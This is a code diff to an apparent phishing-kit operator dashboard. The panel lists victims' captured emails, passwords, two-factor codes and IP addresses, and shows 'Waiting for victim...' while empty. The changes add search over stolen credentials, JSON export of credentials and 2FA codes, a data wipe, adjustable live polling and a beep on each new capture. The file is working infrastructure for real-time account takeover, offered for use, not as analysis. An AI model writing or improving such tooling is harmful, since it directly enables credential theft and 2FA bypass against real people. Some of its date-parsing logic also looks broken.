@@ -75,6 +75,72 @@
         .header-right {
             display: flex;
             gap: 12px;
+            align-items: center;
+        }
+        
+        .refresh-select {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            color: var(--text-primary);
+            padding: 8px 12px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .action-btn {
+            width: 40px;
+            height: 40px;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .action-btn:hover {
+            background: rgba(255,255,255,0.1);
+            transform: scale(1.05);
+        }
+        
+        .connection-status {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #ff3b30;
+            box-shadow: 0 0 10px #ff3b30;
+        }
+        
+        .connection-status.connected {
+            background: #00ff88;
+            box-shadow: 0 0 10px #00ff88;
+        }
+        
+        .search-bar {
+            width: 100%;
+            max-width: 400px;
+            padding: 12px 16px;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        
+        .search-bar::placeholder { color: var(--text-secondary); }
+        
+        .time-ago {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+        
+        @media (max-width: 768px) {
+            .header { flex-direction: column; gap: 16px; }
+            .header-right { flex-wrap: wrap; justify-content: center; }
+            .stats-grid { grid-template-columns: 1fr 1fr; }
+            .main-grid { grid-template-columns: 1fr; }
         }
         
         .settings-btn {
@@ -484,6 +550,15 @@
             </div>
         </div>
         <div class="header-right">
+            <select id="refreshRate" class="refresh-select" onchange="updateRefreshRate()">
+                <option value="1000">1s</option>
+                <option value="1500" selected>1.5s</option>
+                <option value="2000">2s</option>
+                <option value="5000">5s</option>
+            </select>
+            <button class="action-btn" onclick="exportData()" title="Export">📥</button>
+            <button class="action-btn" onclick="clearData()" title="Clear Data">🗑️</button>
+            <div class="connection-status" id="connectionStatus">●</div>
             <div class="live-badge">
                 <div class="live-dot"></div>
                 LIVE
@@ -532,6 +607,7 @@
     
     <div class="glass-panel">
         <div class="panel-title"><span>📧</span> Captured Credentials <span style="float:right;cursor:pointer;opacity:0.5;">↻</span></div>
+        <input type="text" class="search-bar" id="searchCreds" placeholder="Search by email..." oninput="filterCredentials()">
         <div class="capture-list" id="credentials"></div>
     </div>
     
@@ -797,6 +873,15 @@
             renderAll(creds, codes, resends, state, ips);
         }, 1500);
         
+        function filterCredentials() {
+            const search = document.getElementById('searchCreds').value.toLowerCase();
+            const items = document.querySelectorAll('#credentials .capture-item');
+            items.forEach(item => {
+                const email = item.textContent.toLowerCase();
+                item.style.display = email.includes(search) ? '' : 'none';
+            });
+        }
+        
         function renderAll(creds, codes, resends, state, ips = []) {
             document.getElementById('cred-count').textContent = creds.length;
             document.getElementById('2fa-count').textContent = codes.length;
@@ -812,9 +897,10 @@
                     <div class="capture-item">
                         <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email">${c.email}</span></div>
                         <div class="capture-row"><span class="capture-label">Password</span><span class="capture-value">${c.password}</span></div>
-                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${formatTime(c.time)}</span></div>
+                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${timeAgo(c.time)}</span></div>
                     </div>
                 `).join('');
+                filterCredentials();
             }
             
             const codesDiv = document.getElementById('2fa-codes');
@@ -826,7 +912,7 @@
                     <div class="capture-item twofa">
                         <div class="capture-row"><span class="capture-label">Code</span><span class="capture-value code">${c.code}</span></div>
                         <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email">${c.email || 'Unknown'}</span></div>
-                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${formatTime(c.time)}</span></div>
+                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${timeAgo(c.time)}</span></div>
                     </div>
                 `).join('');
             }
@@ -854,7 +940,7 @@
                 ipsDiv.innerHTML = ips.map(ip => `
                     <div class="capture-item">
                         <div class="capture-row"><span class="capture-label">IP</span><span class="capture-value">${ip.ip}</span></div>
-                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${new Date(ip.time).toLocaleString('en-US', {hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true, timeZone: 'America/New_York'})}</span></div>
+                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${timeAgo(ip.time)}</span></div>
                     </div>
                 `).join('');
             }
@@ -889,6 +975,87 @@
                 container.innerHTML = '<div class="empty-state"><div class="empty-icon">👻</div>Waiting for victim...</div>';
             }
         }
+    function timeAgo(timeStr) {
+            if (!timeStr) return '';
+            try {
+                const date = new Date(timeStr.replace('_', ' ').replace(/-/g, ':').replace(/:/g, '-'));
+                const now = new Date();
+                const diff = Math.floor((now - date) / 1000);
+                if (diff < 60) return 'just now';
+                if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
+                if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
+                return Math.floor(diff / 86400) + 'd ago';
+            } catch { return timeStr; }
+        }
+        
+        function playNotification() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.frequency.value = 800;
+                oscillator.type = 'sine';
+                gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
+                oscillator.start(audioCtx.currentTime);
+                oscillator.stop(audioCtx.currentTime + 0.3);
+            } catch(e) {}
+        }
+        
+        function exportData() {
+            Promise.all([fetch('/api/get-creds').then(r => r.json()), fetch('/api/get-2fa').then(r => r.json())]).then(([creds, codes]) => {
+                const data = { credentials: creds, '2fa_codes': codes };
+                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'captured_data_' + new Date().toISOString().split('T')[0] + '.json';
+                a.click();
+            });
+        }
+        
+        function clearData() {
+            if (confirm('Clear all credentials and 2FA codes?')) {
+                fetch('/api/clear-state', { method: 'POST' }).then(() => location.reload());
+            }
+        }
+        
+        let refreshInterval;
+        let lastCredCount = 0;
+        let last2faCount = 0;
+        
+        function updateRefreshRate() {
+            const rate = document.getElementById('refreshRate').value;
+            if (refreshInterval) clearInterval(refreshInterval);
+            refreshInterval = setInterval(async () => {
+                const credsBefore = lastCredCount;
+                const codesBefore = last2faCount;
+                const [credsRes, codesRes, resendRes, stateRes, ipsRes] = await Promise.all([
+                    fetch('/api/get-creds'), fetch('/api/get-2fa'), fetch('/api/get-resend-requests'), fetch('/api/get-state'), fetch('/api/get-ips')
+                ]);
+                const creds = await credsRes.json();
+                const codes = await codesRes.json();
+                const resends = await resendRes.json();
+                const state = await stateRes.json();
+                const ips = await ipsRes.json();
+                if (creds.length > credsBefore) playNotification();
+                if (codes.length > codesBefore) playNotification();
+                lastCredCount = creds.length;
+                last2faCount = codes.length;
+                renderAll(creds, codes, resends, state, ips);
+                document.getElementById('connectionStatus').classList.add('connected');
+            }, parseInt(rate));
+        }
+        
+        document.getElementById('connectionStatus').classList.add('connected');
+        
+        setTimeout(() => {
+            document.getElementById('connectionStatus').classList.add('connected');
+        }, 1000);
+        
+        updateRefreshRate();
     </script>
 </body>
 </html>
